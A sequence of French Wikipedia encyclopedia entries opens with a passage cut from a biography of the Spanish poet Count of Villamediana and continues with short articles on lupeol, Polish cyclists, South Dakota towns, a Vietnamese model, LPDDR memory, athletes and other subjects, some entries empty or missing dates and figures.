Il a de nombreuses maîtresses, aux mains desquelles il apparaît quelquefois en public, comme en une occasion lors d’une première d’une comédie, et il ne cesse d’avoir des amourettes dangereuses ainsi avec une courtisane du roi, telle une Marfisa, peut-être doña Francisca de Tavara, jolie jeune femme portugaise, dame d’honneur de la reine et maîtresse du roi. La légende veut aussi qu’il incendie intentionnellement le colisée d’Aranjuez tout en, pendant les célébrations de l’anniversaire du roi Philippe IV, créant devant la reine, le , sa nouvelle œuvre, "La gloria de Niquea", inspirée d’un épisode d’"Amadis de Grèce", pour pouvoir la prendre dans ses bras, il en était déjà amoureux bien qu’il la touche même si cela était punissable de la peine de mort. Une autre légende veut qu’il se présente à un bal habillé d’une cape recouverte de réaux d’or, faisant allusion à sa chance au jeu, en déclarant "Son mis amores reales", jouant sur le triple sens du mot « reales ». Le dramaturge en tirera une pièce du même titre (1925).
L’origine de l’expression "« Picar muy alto »", qu’on croit être due à l’habileté du comte comme picador, dont il se vante auprès de la reine, le roi ayant répondu : « Piquez bien, mais piquez très haut », jouant de double sens rappelant les escapades de la reine. L’essayiste du Luis Rosales découvre de plus que l’Inquisition intente un procès contre Tassis pour sodomie avec des esclaves noirs et pense que le roi Philippe IV ordonne son assassinat pour éviter le scandale, bien que plusieurs avaient des motifs pour souhaiter sa mort, non seulement pour les satires ou pour avoir été acculés à la ruine, mais également pour des problèmes d’aventures sexuelles, y compris le monarque.
Tassis est assassiné le par Alonso Mateo ou Ignacio Méndez, arbalétriers royaux qui restent impunis de par la haute protection dont ils jouissent. Il est enseveli dans la voûte de la grande chapelle du couvent de Saint-Augustin à Valladolid. Les commanditaires du crime sont Philippe IV ou plus probablement Gaspar de Guzmán ; le moment choisi est celui où Tassis va en voiture avec , par la ; le mobile est peut-être la volonté d’éviter le scandale du procès secret que l’Inquisition établit contre lui, ce qui explique que le crime demeure impuni et caché.
Thématique et esthétique.
Une première collection de ses œuvres paraît à Saragosse en 1629. Elle comprend des poèmes à thématique mythologique ("Fábula de Faetón", long poème composé vers 1617 structuré en huitains hendécasyllabes desquels en traduit deux cent vingt-huit en latin en hexamètres; "Fábula de Apolo y Dafne", "Fábula de Venus y Adonis") qui font sentir une nette influence de Luis de Góngora ; la comédie "La gloria de Niquea" (1622), basée sur "Amadís de Grecia", et plus de deux cents sonnets, épigrammes et rondes à thèmes amoureux, satirique, religieux et patriotiques, où est cultivé un conceptisme particulier.
Conscient de son caractère téméraire et intrépide, un pessimisme traverse la plupart des œuvres du comte, qui écrit ces vers célèbres :

</doc>
<doc id="7279207" url="https://fr.wikipedia.org/wiki?curid=7279207" title="Lupéol">
Lupéol

Le lupéol est un triterpénoïde dérivé du lupane présent dans une grande variété de plantes telles que le manguier, l' ou encore certains pissenlits. C'est un composé pharmacologiquement actif qui possède diverses vertus médicinales, notamment anti-inflammatoires, mais aussi anti-protozoaires, antimicrobiennes, antitumorales, et en chimiothérapie ; il agit efficacement dans les modèles de laboratoire comme inhibiteur du cancer de la prostate et du cancer de la peau. 
Il est produit par de nombreux organismes à partir du sous l'action de la lupéol-synthase.

</doc>
<doc id="7279209" url="https://fr.wikipedia.org/wiki?curid=7279209" title="Franciszek Surmiński">
Franciszek Surmiński

Franciszek Surmiński, né à Dmuchawice (voïvodie de Tarnopol alors en Pologne, aujourd'hui en Ukraine) le et mort le à Prudnik, est un coureur cycliste polonais actif à l'international de 1961 à 1970.
Il a participé à des compétitions sur route et en cyclo-cross.
Il a vécu à Rudziczka près de Prudnik. Le 28 février 2020, il a reçu le titre de citoyen d'honneur de Prudnik.

</doc>
<doc id="7279228" url="https://fr.wikipedia.org/wiki?curid=7279228" title="Lupéol-synthase">
Lupéol-synthase

La lupéol-synthase est une isomérase qui catalyse la réaction :
Cette enzyme forme également de la .

</doc>
<doc id="7279229" url="https://fr.wikipedia.org/wiki?curid=7279229" title="Bogusław Fornalczyk">
Bogusław Fornalczyk

Bogusław Fornalczyk, né le à Jaworznik, commune de Żarki (Voïvodie de Kielce) et mort le , est un coureur cycliste polonais (route et cyclo-cross) actif dans les années 1950 et 1960. Il est notamment vainqueur du Tour de Pologne. Il est aussi membre de l'équipe de Pologne aux jeux olympiques de Rome.
Biographie.
Au cours de sa carrière, Bogusław Fornalczyk a remporté cinq titres de champion de Pologne (1958-1961) et a participé à quatre championnats du monde (1958, 1959, 1961, 1962) et six courses de la paix (1958-1963). Il est diplômé d'une école des mines. Il est marié et a deux filles, Bożena et Ewa. Il vivait à Będzin. 

</doc>
<doc id="7279232" url="https://fr.wikipedia.org/wiki?curid=7279232" title="Paul Jean Flandrin">
Paul Jean Flandrin



</doc>
<doc id="7279241" url="https://fr.wikipedia.org/wiki?curid=7279241" title="Goodwin (Dakota du Sud)">
Goodwin (Dakota du Sud)

La ville de Goodwin est située dans le comté de Deuel, dans l’État du Dakota du Sud, aux États-Unis. Lors du recensement de 2010, sa population s’élevait à . La municipalité s'étend sur .
Histoire.
La ville est fondée en 1878, lors de l’arrivée du chemin de fer. Elle est nommée en l’honneur de George P. Goodwin, un dirigeant du "Winona &amp; St. Peter Railroad".
Démographie.
 

</doc>
<doc id="7279242" url="https://fr.wikipedia.org/wiki?curid=7279242" title="S. Dariaus ir S. Girėno stadionas">
S. Dariaus ir S. Girėno stadionas



</doc>
<doc id="7279245" url="https://fr.wikipedia.org/wiki?curid=7279245" title="Astoria (Dakota du Sud)">
Astoria (Dakota du Sud)

La ville américaine d’Astoria est située dans le comté de Deuel, dans l’État du Dakota du Sud. Lors du recensement de 2010, sa population s’élevait à . La municipalité s'étend sur .
Fondée en 1900, la localité doit son nom à la ville d'Astoria dans l'Oregon, elle-même nommée en l'honneur de John Jacob Astor dont l'expédition passa dans le Dakota du Sud.

</doc>
<doc id="7279250" url="https://fr.wikipedia.org/wiki?curid=7279250" title="Altamont (Dakota du Sud)">
Altamont (Dakota du Sud)

La ville américaine d’Altamont est située dans le comté de Deuel, dans l’État du Dakota du Sud. Lors du recensement de 2010, sa population s’élevait à .
Histoire.
La localité est fondée en 1880. Elle doit son nom à sa situation au sommet des collines environnantes ou à Ed Altamont, un fermier local.
Démographie.
 

</doc>
<doc id="7279251" url="https://fr.wikipedia.org/wiki?curid=7279251" title="Lâm Uyển Nhi">
Lâm Uyển Nhi

Lâm Uyển Nhi, née en à Nha Trang et morte le à Hanoï, est une mannequin et danseuse vietnamienne.
Biographie.
Lâm Uyển Nhi est née dans une famille composée de huit enfants. Elle grandit à Nha Trang avec sa mère et son beau-père sans avoir la chance de connaître son père biologique, fils d'un officier de la force aérienne de l'armée de la République du Vietnam.
En 1989, elle remporte le titre de Miss Saigon à Nha Trang et quitte l'école pour travailler dans une entreprise à Hô-Chi-Minh-Ville.
En 1994, elle apprend la danse et se lance dans le mannequinat à Singapour Elle fait des rencontres et on lui fait découvrir la cocaïne. Trois mois plus tard, elle rentre à Hô-Chi-Minh-Ville, dépendante à la drogue.
Après avoir réussi à arrêter la cocaïne, son mari, Pactric prévoit de l'emmener en France pour lui faire rencontrer ses parents mais elle parle peu le français et lui demande d'attendre un certain temps. Elle séjourne dans un hôtel à Hanoï pour obtenir des papiers pour ensuite aller s'en voler pour la France.
En 2001, Patrick, son mari est arrêté par la police française et condamné à 18 ans de prison pour trafic illégal d'antiquités.
Complètement effondrée, elle tombe de nouveau dans la drogue pour la deuxième fois et se lance dans la prostitution. Elle est arrêtée et emmenée dans un centre social pour le travail et l'éducation à Hà Tây. Enceinte de son second fils, elle découvre qu'elle est atteinte du VIH. Elle fait le dépistage du VIH et apprend que le résultat de son fils est négatif.
Elle vit ses derniers jours à Center for Labor Education et décède le des suites de sa maladie.
Vie privée.
En 1990, elle se marie avec le dirigeant d'une entreprise française, Pactric (né en 1951) et donne naissance à son premier enfant, Lâm Kỳ Vĩ (Patrick Thovani). Ensuite, nait son second fils, Nam, le .
Fiction.
En 2008, la série télévisée documentaire Âm tính écrite et réalisée par Nguyễn Quang Lập, raconte la vie de Lâm Uyển Nhi (rôle jouée par Miss Vietnam 2006, Mai Phương Thúy).

</doc>
<doc id="7279257" url="https://fr.wikipedia.org/wiki?curid=7279257" title="Stanisław Gazda">
Stanisław Gazda

Stanisław Gazda, né le à Pszczyna (Silésie) et mort le à Rybnik, est un coureur cycliste polonais, membre de l'équipe de Pologne aux Jeux Olympiques de Rome en 1960. Il a été sélectionné plusieurs fois pour le championnat du monde sur route et obtenu de bons résultats à Course de la Paix où il se classait en 1962. Gazda est sociétaire au club cycliste local du Start Bielsko.

</doc>
<doc id="7279260" url="https://fr.wikipedia.org/wiki?curid=7279260" title="Amyrine">
Amyrine

Les amyrines forment un couple d'isomères de formule brute appelés α-amyrine et β-amyrine. Ce sont des triterpénoïdes très largement distribués dans la nature. Elles ont été isolées à partir d'une grande variété de plantes.

</doc>
<doc id="7279261" url="https://fr.wikipedia.org/wiki?curid=7279261" title="Stade Kaftantzoglio">
Stade Kaftantzoglio



</doc>
<doc id="7279267" url="https://fr.wikipedia.org/wiki?curid=7279267" title="Wilson's Creek">
Wilson's Creek

Wilson's Creek peut désigner

</doc>
<doc id="7279270" url="https://fr.wikipedia.org/wiki?curid=7279270" title="Forêt cultivée">
Forêt cultivée



</doc>
<doc id="7279274" url="https://fr.wikipedia.org/wiki?curid=7279274" title="William &quot;Bloody Bill&quot; Anderson">
William &quot;Bloody Bill&quot; Anderson



</doc>
<doc id="7279275" url="https://fr.wikipedia.org/wiki?curid=7279275" title="Marge (auteur)">
Marge (auteur)

Marjorie Henderson Buell, plus connue sous nom de plume Marge est une autrice de comic strip, née le et morte le . Sa création principale fut "Little Lulu".
Biographie.
Jeunesse et premiers travaux.
Marjorie Lyman Henderson naît à Philadelphie le . Elle commence à dessiner très jeune et elle écrit de nombreuses lettres pour le courrier des lecteurs de "For Boys and girls" le supplément pour enfant du journal de Pliladelphie "Public Ledger". Dès la fin de ses études elle commence à vendre des dessins humoristiques à des revues telles que Collier's, Life, le Saturday Evening Post, etc. En 1927, ellecrée le comic strip "The Boyfriend" puis en 1929 la série "Dashing Dot" qui suit la mode des flappers.
Little Lulu.
En 1934 le Saturday Evening Post lui commande un dessin pour remplacer l'habituel Henry de Carl Thomas Anderson. Marjorie Lyman Henderson, qui a pris pour pseudonyme Marge depuis "Dashing Dot" fournit alors un dessin humoristique dont l'héroïne s'appelle Little Lulu. Dès lors, le personnage multiplie les apparitions dans des comic books, des dessins animés, des publicités et plusieurs produits dérivés sont distribués. En 1945, Marge signe un contrat avec Western Publishing qui édite alors un comic book intitulé "Marge's Little Lulu" bien que Marge ne participe pas à l'écriture ou au dessin de ces histoires. En 1950, Marge signe un second contrat, cette fois avec qui distribue un comic strip de Little Lulu jusqu'en 1969. Là encore, Marge ne travaille pas à ce strip. Si sa création lui permet de très bien gagner sa vie, Marge choisit une carrière d'illustratrice de poèmes et de livres pour enfants écrits par Ruth Plumly Thompson. En 1972, Marge décide de prendre sa retraite avec son mari C. Addison Buell, avec qui elle a eu deux fils, et vend les droits de "Little Lulu" à Western Publishing. Elle meurt le .
Reconnaissance posthume.
En 2000, elle est ajoutée au temple de la renommée des auteures de bande dessinée puis en 2015 au temple de la renommée Will Eisner (choix du jury).
Influences.
Le style de Marge, surtout à ses débuts, est influencé par celui de John Held Jr..

</doc>
<doc id="7279280" url="https://fr.wikipedia.org/wiki?curid=7279280" title="Triumphpforte">
Triumphpforte

La Triumphpforte est un arc de triomphe de la ville d'Innsbruck, dans le Tyrol, en Autriche. Située à l'extrémité sud de Maria-Theresien-Straße, dans le centre-ville, elle a été construite sur ordre de l'impératrice Marie-Thérèse d'Autriche à l'occasion du mariage de son fils Léopold avec l'Espagnole Marie-Louise au milieu du .
En septembre 2012, un activiste pour les droits des animaux a voulu attirer l'attention en escaladant l'arc de triomphe.

</doc>
<doc id="7279284" url="https://fr.wikipedia.org/wiki?curid=7279284" title="Telecottage">
Telecottage

Telecottage (ou Télecottage, ou Télécottage) est le nom donné à un type de télécentre ; 
En l’occurrence, il s'agit d'un système d'organisation communautaire inventée en Suède pour faciliter l’apprentissage et l’accès aux nouvelles technologies de l’information et de la communication, au service du travail et télétravail notamment. 
Pour l'association européenne des télécottages ; EUTA (pour « European Union of Telecottage Associations »), basée à Budaörs, en Hongrie), il s'agit d'un point d'accès communautaire offrant une large gamme de services de communication de bureautique et d'informations, animés par des "IS-mentors" (les travailleurs du télécentre). Chaque télécottage est membre d'un réseau et dispose d'un portefeuille minimal et standard de services, voire plus pour les besoins de la communauté locale.
Histoire.
Le telecottage a plutôt et d'abord été créé pour des communautés rurales plus ou moins isolées (notamment par la neige en hiver en Europe du Nord).
Le mouvement s’est ensuite développé au Royaume-Uni où l’on comptait en 1997 environ 200 telecottages. 
En France, il existe de nombreux télécentres, cybercentres et cyberplateforme, dont certains comme dans le Berry se sont intitulés télécottage ; constitués en projet social et de développement en milieu rural associant un lieu convivial, des espaces de travail, de formation et de services (incluant un point de recherche d'emploi et une garderie d'enfants) tout en ayant une vocation commerciale (.

</doc>
<doc id="7279285" url="https://fr.wikipedia.org/wiki?curid=7279285" title="Camers">
Camers



</doc>
<doc id="7279288" url="https://fr.wikipedia.org/wiki?curid=7279288" title="Édouard Rist">
Édouard Rist

Le professeur Édouard Rist (, Strasbourg - , de Paris) est un médecin français, spécialisé en pneumologie.
Biographie.
Son père, Adrien, était un docteur intéressé principalement par les troubles mentaux, notamment chez des patients tuberculeux. Il est le frère de l'économiste Charles Rist. En 1871, ses parents quittent l'Alsace pour garder la nationalité française. Il fréquente le collège Gaillard à Lausanne, où il apprend l'anglais, qu'il maîtrisera parfaitement par la suite, puis à l'âge de 15 ans, il poursuit ses études secondaires au Lycée Louis le Grand à Paris. 
En 1898, à la suite de sa thèse : "Études bactériologiques sur les infections d'origine otique", il devient docteur en médecine de l'université de Paris. 
Il est médecin-inspecteur général des Services sanitaires maritimes et quarantenaires en Égypte de 1899 à 1900.
Chef de laboratoire à l'hôpital Trousseau de 1901 à 1905 puis médecin des Hôpitaux de Paris en 1905, il exerce à l'hôpital Laennec à Paris de 1910 à 1937 et au dispensaire Léon-Bourgeois de 1912 à 1937.
Il sert comme médecin major de première classe, puis comme lieutenant-colonel médecin durant la Première Guerre mondiale.
Il effectue de nombreuses missions scientifiques françaises à l'étranger (États-Unis, Canada, Brésil, Algérie, Maroc...).
Rist est directeur général des Services d'hygiène et d'assistance médicale d'Alsace et de Lorraine de 1918 à 1919.
Il est chargé de cours de clinique annexe à la Faculté de médecine de Paris.
Il est médecin consultant des Chemins de fer de l'État, puis de la SNCF.
Membre de l'Académie de médecine de Paris depuis 1933, il en devient président en 1948.
Rist est président de l'École professionnelle des infirmières de Montrouge, de la Société des études scientifiques sur la tuberculose et de la Fondation Édith-Seltzer, vice-président du Comité national de défense contre la tuberculose, du Service social à l'hôpital, du conseil d'administration du Sanatorium des étudiants et du conseil d'administration de l'École d'infirmières du Comité national de défense contre la tuberculose, membre conseiller pour la France de l'Union internationale contre la tuberculose, membre du Conseil supérieur d'hygiène de France, du Comité consultatif de l'enseignement supérieur de 1928 à 1937, de la Commission des vaccins et sérums, de la Commission de la tuberculose au ministère de la Santé publique, de l'Institut international de statistique…
Lauréat de l'Académie de médecine de Paris et de l'Académie des sciences, il est reçu "" du Collège royal de médecine en 1939 et docteur "honoris causa" de l'université de Prague en 1947.

</doc>
<doc id="7279289" url="https://fr.wikipedia.org/wiki?curid=7279289" title="Printen">
Printen

Le Printen (ou "Printen" d'Aix-la-Chapelle) est une spécialité culinaire aixoise possédant une appellation d'origine contrôlée. Ils sont composés de farine, de sucre, de cassonade et d'épices.
Histoire.
La fabrication du pain d'épice est avérée depuis l'Antiquité. Dans certaines villes, le pain était moulé comme à Dinant pour la couque de Dinant. L'origine du "Printen" vient d'ailleurs de cette spécialité par un maître de la guilde qui s'était rendu à Aix-la-Chapelle pour vérifier la construction d'une statue en bronze de l'empereur Charlemagne, coulée simultanément à Dinant et dans la cité de l'empereur. Lors de la pause déjeuner, il offrit ses pains d'épices moulés aux apprentis et maîtres auprès de qui ils eurent un franc succès. Les boulangeries d'Aix-la-Chapelle reprirent la recette et l'améliorèrent.
À l'origine, le "Printen" était vendu par les pharmaciens qui considéraient que certains des ingrédients (miel, plusieurs herbes et épices) avaient des prescriptions médicales. Le "Printen" est fabriqué dans Aix-la-Chapelle ou dans ses environs proches. De nombreuses variantes sont créées à partir du .
Le "Printen" est aujourd'hui l'emblème du marché de Noël d'Aix-la-Chapelle.
Production.
La préparation était à la base adoucie avec du miel des Amériques et du sucre de canne mais à la suite du blocus continental de Napoléon de 1806, les boulangers remplacèrent ces ingrédients par du sucre de betterave qui donne une matière plus coulante et empêcha ainsi de le presser dans des moules à pâtisseries fines. La pâte est faite à partir de farine, d'eau et d'édulcorants, comme édulcorant dans la pâte sont le sucre, soit principalement brun, sucre candi et le sirop ainsi que du miel et comme levain principalement la potasse, à l'origine du bicarbonate d'ammonium.
Le mélange d'épices se compose entre autres de cannelle, d'anis, de clous de girofle, de cardamome, de coriandre cultivée, de piment mais aussi d'écorces d'orange, de zeste de citron et de gingembre. Le pourcentage d'assaisonnement est un secret de leurs fabricants respectifs. La garniture diffère selon le produit.

</doc>
<doc id="7279290" url="https://fr.wikipedia.org/wiki?curid=7279290" title="Tahsil">
Tahsil



</doc>
<doc id="7279291" url="https://fr.wikipedia.org/wiki?curid=7279291" title="Tahsils">
Tahsils



</doc>
<doc id="7279294" url="https://fr.wikipedia.org/wiki?curid=7279294" title="Shara Nelson">
Shara Nelson

Shara Nelson, née en 1965 à Londres, est une chanteuse et compositrice britannique.
Elle est notamment connue pour son travail avec le groupe Massive Attack dans les années 1990 (singles "Unfinished Sympathy" et "Safe from Harm").

</doc>
<doc id="7279300" url="https://fr.wikipedia.org/wiki?curid=7279300" title="Gare Centrale d'Innsbruck">
Gare Centrale d'Innsbruck



</doc>
<doc id="7279319" url="https://fr.wikipedia.org/wiki?curid=7279319" title="Nethaneel Mitchell-Blake">
Nethaneel Mitchell-Blake

Nethaneel Mitchell-Blake (né le à Londres) est un athlète britannique spécialiste du 200 m. Vice-champion d'Europe du 200 m à Berlin en 2018, il remporte plusieurs médailles internationales avec le relais 4 x 100 m britannique : une en or aux Mondiaux de Londres en 2017 et deux en argent aux Mondiaux de Doha en 2019 et aux Jeux olympiques de Tokyo en 2021.
Biographie.
Le à Rieti, il bat son record personnel en 20 s 62 pour remporter le titre des Championnats d'Europe juniors. 
Le , Mitchell-Blake devient le à briser la barrière des 20 s sur 200 m, réalisant 19 s 95. Cette performance le tient à seulement 8/100 des 19 s 87 du record national de John Regis.
Champion du monde du 4 x 100 m (2017).
Le , il passe également sous la barrière des dix secondes sur 100 m, réalisant 9 s 99. Il devient alors le athlète européen à descendre à la fois sous les 10 s (100 m) et les 20 s (200 m). Le 10 août de la même année, il échoue au pied du podium des Championnats du monde de Londres sur 200 m, devant son public, en 20 s 24. Il se rattrape avec le relais 4 x 100 m où il devient champion du monde en 37 s 47, battant par la même occasion le record d'Europe de 37 s 73 datant de 1998. Les Britanniques devancent les États-Unis (37 s 52) et le Japon (38 s 04).
En début de saison 2018, il remporte le meeting de Baton Rouge en 10 s 08 (+ 2,0 m/s). Le , il devient vice-champion d'Europe du 200 m en 20 s 04 lors des championnats d'Europe de Berlin, derrière le Turc Ramil Guliyev (19 s 76).
Vice-champion du monde et olympique du 4 x 100 m (2019-2021).
Aux Mondiaux de Doha en octobre 2019, Mitchell-Blake et ses coéquipiers britanniques ne conservent pas leur titre mondial sur 4 x 100 m mais parviennent tout de même à décrocher la médaille d'argent derrière les Etats-Unis en 37 s 36, améliorant leur propre record d'Europe établi deux ans auparavant.
Deux ans plus tard aux Jeux Olympiques de Tokyo, Mitchell-Blake est aligné en tant que dernier relayeur pour la finale du 4 x 100 m, en compagnie de Chijindu Ujah,Zharnel Hughes et Richard Kilty. Prenant le témoin en première position, il est cependant rattrapé par l'Italien Filippo Tortu qui le coiffe sur la ligne pour un centième de seconde. Les Italiens sont sacrés champions olympiques en 37 s 50 tandis que les Britanniques doivent se contenter de l'argent en 37 s 51. Le quatuor est déchu de sa médaille en février 2022 après le contrôle positif de Ujah en août 2021.
Il remporte la médaille de bronze du relais 4 × 100 m des championnats du monde 2022, à Eugene, derrière le Canada et les États-Unis.

</doc>
<doc id="7279325" url="https://fr.wikipedia.org/wiki?curid=7279325" title="Comment ça va pour vous ?">
Comment ça va pour vous ?

Comment ça va pour vous ? est une chanson de Patrick Bruel, sortie en 1985. Coécrite par Patrick Bruel et Gérard Presgurvic, elle remporte un succès commercial et se classe au Top 50. 
Histoire.
En 1985, après le tube "Marre de cette nana-là !", Patrick Bruel enchaîne sur un deuxième succès avec "Comment ça va pour vous ?". Le titre au ton léger et humoristique est basé sur des paroles répétitives mais efficaces. Pour Sophie Grassin et Gilles Médioni (biographes), la chanson n'a . 
Comme "Marre de cette nana-là", la chanson ne figurait pas à l'origine sur le premier album de Patrick Bruel, "De face". Elles ont été rajoutées lors de la sortie en CD.
Classements.
Le 29 juillet 1985, le single entre à la du Top 50. Il se classe à la le 16 septembre 1985 et restera durant 19 semaines dans le classement.

</doc>
<doc id="7279326" url="https://fr.wikipedia.org/wiki?curid=7279326" title="Alphonse-Edgar Guillemette">
Alphonse-Edgar Guillemette

Alphonse-Edgar Guillemette (né le à Princeville, mort le à Shawinigan Falls) est un homme politique québécois. Il a été député du district électoral de Saint-Maurice à l'Assemblée législative du Québec de 1924 à 1927.
Biographie.
Il est le fils de Ludger Guillemette, marchand, et d'Anabella Provencher. Il s'établit à Shawinigan en 1899.
Il est élu conseiller municipal lors des premières élections municipales du village de Shawinigan, le . Son mandat prend fin le lors de l'élection du conseil municipal de la ville de Shawinigan Falls, qui a remplacé la municipalité de village après moins d'un an. Il épouse Éda Trudel le à Sainte-Geneviève-de-Batiscan. Il est élu conseiller municipal de la ville de Shawinigan Falls lors de l'élection municipale de 1909 et réélu lors des élections municipales de 1911 et de 1913. Il conserve ce poste jusqu'en 1914.
À l'élection partielle du dans le district électoral de Saint-Maurice, il est le candidat officiel du Parti libéral mais il est défait par le candidat libéral indépendant, le notaire Nestor Ricard. À la suite de la mort du député Ricard, une élection partielle est tenue le et Guillemette y est élu député de Saint-Maurice à l'Assemblée législative du Québec sous l'étiquette du Parti libéral. Il est de nouveau le candidat officiel du Parti libéral à l'élection générale du 16 mai 1927 et cette fois il est défait par le candidat libéral indépendant J.A. Frigon.

</doc>
<doc id="7279330" url="https://fr.wikipedia.org/wiki?curid=7279330" title="LPDDR">
LPDDR

La mémoire LPDDR (en anglais : ', littéralement : « Vitesse de données double à faible consommation »), ou LPDDR SDRAM, également appelée DDR mobile (abrégé en mDDR), est un type de mémoire, reprenant la technologie DDR SDRAM, en l'adaptant aux périphériques mobiles (smartphone, ordinateur portable…), via des technologies d'économie d'énergie.
La première version, parfois appelée LPDDR1, est de la DDR SDRAM, comportant plusieurs modifications mineures afin de réduire l'enveloppe énergétique globale.
La plus grosse économie énergétique est liée à la tension qui passe de pour la DDR de bureau à pour la DDR mobile. Les autres économies d'énergie sont le besoin moins important de rafraîchissement à basse température, le rafraîchissement automatique pouvant se limiter à une partie de la table mémoire, et un mode "arrêt profond" ("" en anglais) qui sacrifie le contenu de la mémoire. De plus, les puces sont plus petites, utilisant moins d'espace sur la carte électronique que leur équivalent non mobile.
Samsung et Micron sont les deux principaux fournisseurs de ces technologies, qui sont utilisées sur des tablettes telles que l'iPad d'Apple et les de Samsung.
Sont ensuite sortis les modèles LPDDR2, LPDDR3 puis LPDDR4, améliorant successivement les caractéristiques de ce type de mémoire. Les versions E ont une fréquence de 266,7 MHz, au lieu de 200 MHz, augmentant ainsi sensiblement leur vitesse.

</doc>
<doc id="7279342" url="https://fr.wikipedia.org/wiki?curid=7279342" title="Vide (album)">
Vide (album)



</doc>
<doc id="7279348" url="https://fr.wikipedia.org/wiki?curid=7279348" title="Alison Cox">
Alison Cox

Alison Cox est une rameuse américaine née le à Turlock.
Biographie.
Les Jeux olympiques d'été de 2004 voient Alison Cox remporter la médaille d'argent en huit avec Kate Johnson, Samantha Magee, Anna Mickelson-Cummins, Megan Dirkmaat, Mary Whipple, Laurel Korholz, Caryn Davies et Lianne Nelson.

</doc>
<doc id="7279349" url="https://fr.wikipedia.org/wiki?curid=7279349" title="Nisis">
Nisis



</doc>
<doc id="7279355" url="https://fr.wikipedia.org/wiki?curid=7279355" title="Turlock">
Turlock

La ville de est située dans le comté de Stanislaus, dans l’État de Californie, aux États-Unis. Sa population s’élevait à lors du recensement.
Démographie.
 

</doc>
<doc id="7279356" url="https://fr.wikipedia.org/wiki?curid=7279356" title="Michael Orozco">
Michael Orozco

Michael Orozco Fiscal, né le à Orange en Californie, est un joueur international américain de soccer qui joue au poste de défenseur central à l'Orange County SC en USL Championship.
Biographie.
En club.
Les parents de Michael sont originaires du Mexique et il porte le nom de son père tout d'abord, Orozco, et de sa mère, Fiscal. Il intègre dans le centre de formation de l'équipe de Mexican Primera A de San Luis FC en 2006.
Orozco fait ses débuts professionnels pour San Luis durant le championnat d'Apertura 2006 quand il entre en jeu en seconde mi-temps contre les Tigres UANL mais il retourne aux vestiaires deux minutes plus tard après avoir été sanctionné par l'arbitre d'un carton rouge.
En , Orozco quitte San Luis pour rejoindre la Major League Soccer et la franchise du Union de Philadelphie sous forme de prêt. À l'issue de la saison, Philadelphie décide de ne pas lever l'option d'achat sur le joueur et il rentre donc à San Luis.
Par la suite, Orozco est de nouveau prêté, mais à Puebla FC pour la saison de Clausura 2013. Le transfert est définitif durant l'été alors que San Luis déménage et change d'identité.
En sélection.
Orozco est appelé pour un camp de préparation de l'équipe américaine U-23 en vue des Jeux olympiques 2008 à Pékin. Il aide donc l'équipe U-23 à se qualifier pour les Jeux de 2008 avec de grandes performances en défense et il est nommé dans le meilleur XI des qualifications de la CONCACAF pour les Jeux olympiques de 2008 ("Best XI of the 2008 CONCACAF Men’s Olympic Qualification All-Tournament Team"). Le , il est donc logiquement appelé pour représenter son pays aux Jeux olympiques se tenant à Pékin. Il débute les trois rencontres mais reçoit un carton rouge à la de la rencontre opposant les Américains au Nigeria que ces derniers remporteront.
Le , Michael est appelé pour la première fois en sélection nationale pour un camp d'entraînement afin de préparer les pour la Coupe du monde 2010 face à Cuba et Trinité-et-Tobago. Il débute lors de cette dernière rencontre, le , jouant les 90 minutes de ce match que les Américains perdront 2-1. Après cette défaite, il faut attendre pas loin de trois ans avant de revoir Orozco en sélection nationale. Il revient à l'occasion d'un match amical contre le Mexique qui est médiatisée en raison des débuts du nouveau sélectionneur des "Yanks", Jürgen Klinsmann. Il affronte de nouveau le Mexique une année plus tard, le , inscrivant l'unique but de la rencontre qui est synonyme de première victoire américaine en terres mexicaines. Les Mexicains encaissent alors seulement leur au mythique Stade Azteca.

</doc>
<doc id="7279358" url="https://fr.wikipedia.org/wiki?curid=7279358" title="Plaza de los héroes">
Plaza de los héroes



</doc>
<doc id="7279363" url="https://fr.wikipedia.org/wiki?curid=7279363" title="Dura (Hébron)">
Dura (Hébron)

Dura () est une ville palestinienne située à au sud-ouest de Hébron dans le Gouvernorat de Hébron au sud de la Cisjordanie.
Selon le bureau palestinien des statistiques, Dura comptait une population de en 2007. La ville est située à une altitude de 898 mètres approximativement. Le maire de la ville est Mohammed Samir actuellement.
Étymologie.
Selon la municipalité, le nom "Dura" est dérivé d'un mot cananéen qui signifie "maison" () et non du mot arabe pour le maïs (). Son nom cananéen antique est Adoraïm qui est mentionné dans la Bible (2 Chroniques 11:9) comme l'une des villes fortifiées par Roboam.
Histoire.
La ville de Dura a été fondée avant environ à l'époque cananéenne. Dura a été appelée "Adora" pendant la période classique. La ville a été occupée par les perses en 332 . À l'époque romaine (63 - 636). Le pays a été divisé en cinq provinces et Dura a été la capitale d'une région appelée "Adumaa". Dans la première période islamique, Dura était célèbre pour ses vignobles et un type de raisin appelé Duri.
Époque ottomane.
En 1596, Dura est apparue dans les registres de l'impôt ottoman comme étant dans le Nahié de Khalil du Liwa de Qods. Elle avait une population de 49 ménages musulmans et les impôts étaient payés sur le blé, l'orge, les olives, les vignes ou encore les arbres fruitiers ainsi que les chèvres ou les ruches.
En 1834, les habitants de Dura ont participé à un soulèvement contre Ibrahim Pacha, qui a repris la région entre 1831-1840.
Démographie.
En 1922, Dura avait une population de . Le nombre est passé à en 1931, tous musulmans.
Selon le bureau palestinien des statistiques, Dura avait une population de en 2007.
Climat.
Le climat de la ville est sec au cours des étés et connaît des précipitations modérées pendant l'hiver. Les précipitations annuelles dépendent des zones géographiques spécifiques dans la ville. La région de Dahr Alhadaba reçoit une moyenne annuelle de 400-600 mm de pluie, les pentes du sud 300-400 mm de pluie, la région des collines du nord 250-300 mm de pluie et la région près du Néguev 150-200 mm de pluie.

</doc>
<doc id="7279365" url="https://fr.wikipedia.org/wiki?curid=7279365" title="Évêque d'Exeter">
Évêque d'Exeter

L'évêque d'Exeter est à la tête du diocèse anglican d'Exeter, dans la province de Cantorbéry. Son siège est la cathédrale Saint-Pierre d'Exeter.
Histoire.
Vers 910, le diocèse de Sherborne est divisé en trois sièges correspondant chacun à un comté : Crediton pour le Devon, Sherborne pour le Dorset et Wells pour le Somerset. En 1050, l'évêque de Crediton Leofric, également évêque de Cornouailles, fusionne ses deux diocèses et s'installe à Exeter.

</doc>
<doc id="7279367" url="https://fr.wikipedia.org/wiki?curid=7279367" title="Lesley Bush">
Lesley Bush

Lesley Leigh Bush, née le à Orange (New Jersey), est une plongeuse américaine. 
Biographie.
Lesley Bush remporte aux Jeux olympiques d'été de 1964 à Tokyo la médaille d'or du plongeon individuel à 10 mètres. Trois ans plus tard, elle obtient l'or aux Jeux panaméricains de Winnipeg.
Elle entre à l'International Swimming Hall of Fame en 1986.
